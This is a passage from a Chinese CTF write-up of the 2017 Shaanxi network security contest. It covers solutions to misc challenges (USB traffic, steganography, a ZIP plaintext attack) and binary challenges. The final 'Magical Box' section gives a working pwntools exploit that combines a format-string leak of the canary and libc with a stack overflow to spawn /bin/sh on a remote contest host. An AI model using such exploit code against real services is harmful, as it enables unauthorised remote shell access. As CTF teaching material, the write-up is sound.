        for j in range(0,len(a)):
            if a[j]=='*':
                a[j]='W'
        for k in range(0,len(a)):
            if a[k]=='_':
                a[k]='1'
        a.reverse()
        flag_1=''.join(a)
        for i in range(0,25):
            flag_1=b64decode(flag_1)
        print flag_1
    with open("plaint.txt","r") as f:
        decode(f.read())
**轨迹 150**
记得X-NUCA的misc专场出过USB的流量分析题
tshark.exe -r trace.io -T fields -e usb.capdata > usbdata.txt
    01:00:00:00:ff:ff:00:00
    01:00:00:00:ff:ff:00:00
    01:01:01:00:ff:ff:00:00
    01:01:01:00:ff:ff:00:00
    01:01:01:00:ff:ff:00:00
    01:01:ff:ff:00:00:00:00
    01:01:ff:ff:00:00:00:00
    01:01:ff:ff:00:00:00:00
    01:01:ff:ff:00:00:00:00
    01:01:ff:ff:01:00:00:00
    01:01:ff:ff:01:00:00:00
    01:01:ff:ff:01:00:00:00
    01:01:ff:ff:02:00:00:00
    01:01:ff:ff:01:00:00:00
    01:01:ff:ff:02:00:00:00
跑出来这样的数据。
第一位没什么用，第二位是0代表没有按键，1代表鼠标左击，2代表鼠标右击。
第三第四位 合起来 像word字节,代表水平方向负数、正数代表左右移。
第五第六位 合起来 代表垂直方向上下移动。
直接使用脚本
    nums = []
    keys = open('usbdata.txt','r')
    out = open('data.txt','w')
    posx = 60
    posy = 10
    for line in keys:
        # if len(line) != 12 :
             # continue
        x = int(line[6:8],16)
        y = int(line[12:14],16)
        # print x,y
        if x > 127 :
            x -= 256
        if y > 127 :
            y -= 256
        posx += x
        posy += y
        btn_flag = int(line[3:5],16)  # 1 for left , 2 for right , 0 for nothing
        if btn_flag == 1 :
            out.write( "%d %dn"%(posx ,posy))
    keys.close()
    out.close()
得到坐标之后
再到kali用 gnuplot 来画图,
flag{stego_xatu@}
**种棵树吧 100**
第一个图片后面连接了一个zip。
解压出一个gif但是少了一点文件头，添加GIF89文件头。然后可以看到一张图片。
第二张图直接看属性
就得到 Post-order{YR!eVa-gLAoxdj{pw}8zkUnGuIHh:r65f2lFsEi} In-order{RY!heHVaL-goAI{dxjGpnUw8}kzuEr:s56fFl2i}
    hi! HERe Is Your FLAG :flag{n52V-jpU6d_kx8zw}
接下来按照层序排列可以得到flag：flag{n52V-jpU6d_kx8zw}
**我们的秘密 250**
这一题比较复杂。
先用二进制查看器看了一下压缩包的结构，发现有很多个readme.txt
然后将最底层的一个readme.zip抠出来，试了一下伪加密，是可以过的。
里面是"为提高大学生的网络安全技术水平，培养大学生的团队协作能力，由陕西省兵工学会主办，西安工业大学承办的“2017年第三届陕西省网络空间安全技术大赛”即将于2017年4月15-16日进行线上初赛，2017年5月13日进行线下总决赛。"
然后前面一个zip是真加密，这里我想到了使用zip的明文攻击
跑了我一个多小时才跑出来，，，电脑太差劲了。
跑出来是 3xatu2o17
解压出三个文件，然后wav的是莫斯电码 解出来是，CTFSECWAR2017
试了一下提交flag然后没过
接下来想到还有一个mp4然后用各种工具去尝试,加密密钥为CTFSECWAR2017。在使用到 OurSecret的时候，结果正确了得到flag
flag{v1de0c0nc3a1lala}
**什么玩意**
这一题初看是一个蓝牙的pin码破解，在github上找到了脚本，BTcrack
《无线网络安全攻防实战进阶》杨哲 写的这一本书中也包含了这一个的讲解。
而且网上也找到了相同的题目文件。
同时也获得了 link key 。但是第一个文件 只有数字，，没有这方面的知识完全不会做。。只能够做到这一层了。
真的是什么玩意儿！
**Bin**
* * *
**Now you see me 200**
这个题目我想要打人了。。出题人这样就没有意思了。
在exe的属性里面，放了flag的前半段。就是
解密出来为 flag{root@mail:
在ida中首先找到了字符串，就是 Verification code:
然后可以使用 OD去跟踪这一部分的代码了。
具体的加密函数为sub_402640。
是使用 有这样的操作，输入的长度为9. 应该都是要输入数字。
然后分成三组，每一组记作a1,a2,a3
    (a1+a2)*2-a1 == cmp1
    (a2*3)-a2 ==cmp2
    (a2*5+a3*2)-a3 == cmp3
比对的数组为 0x0b 0x06 0x15 0x0b 0x04 0x0e 0x16 0x10 0x31
写了一个简单脚本暴力了一下，轻松得到flag
    cpp
    #include
    #include
    int main(){
        char flag[]={0x0b ,0x06 ,0x15 ,0x0b ,0x04 ,0x0e ,0x16 ,0x10 ,0x31};
        for(int i=0;i<16;i++){
            for(int j=0;j<16;j++){
                for(int z=0;z<16;z++){
                    if(((i+j)*2-i==flag[6])&&(j*3-j==flag[7])&&(j*5+z*2-z)==flag[8]){
                        printf("%d %d %dn",i,j,z);
                    }
                }
            }
        }
    }
得到536 724 689
所以 flag{root@mail:0IdWan9}
**Magical Box 200**
首先看了下防护机制
然后在IDA中可以看到一个相当明显的格式化字符串漏洞
got表无法修改，但是在栈空间中可以找到canary的值，以及___libc _ start _main函数地址
同时对输入的用户名进行了一步异或操作后进行验证
已经已知了s2，动态调试出了用户名为admin2017c，继续跟下去后发现一个栈溢出漏洞
写完EXP后本地能过远程过不了，猜测是__lib_start_main函数的本地偏移与远程不同采取爆破的办法出了flag
附上exp
    python
    from pwn import *
    #context(log_level="debug")
    #p = process("./pwn_box")
    #libc = ELF('libc.so.6')
    libc = ELF('libc.so.6_pwnbox')
    elf = ELF('pwn_box')
    puts_got = 0x0804b030
    printf_got = 0x0804b010
    def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0],"b *0x08048A11nc")
    #launch_gdb()
    for x in range(240,0xff):
        try:
            print x
            p = remote('117.34.80.134',7777)
            #p = remote('127.0.0.1',10001)
            p.recvuntil("?n")
            p.sendline("%7$x")
            p.recvuntil("!")
            canary = int('0x'+p.recv(8),16)
            #print hex(canary)
            p.recvuntil("?n")
            p.sendline("%43$x")
            p.recvuntil("!")
            libc_start_main_addr = int('0x'+p.recv(8),16)-x
            #print hex(libc_start_main_addr)
            plt =  libc.symbols['__libc_start_main']
            system_addr = libc_start_main_addr- (plt - libc.symbols['system'])
            binsh_addr = libc_start_main_addr- (plt - next(libc.search('/bin/sh')))
            #print hex(system_addr)
            #print hex(binsh_addr)
            p.recvuntil("?n")
            p.sendline("admin2017c")
            p.recvuntil(".nn")
            p.sendline('add')
            p.recvuntil(": ")
            p.sendline("20")
            p.recvuntil(": ")
            p.sendline("a")
            p.recvuntil(": ")   
            payload = 'a'*30 + p32(canary)+'b'*0xc+p32(system_addr)+p32(0)+p32(binsh_addr)
            p.sendline(payload)
            p.interactive()
        except:
            p.close()
            continue
    #x=243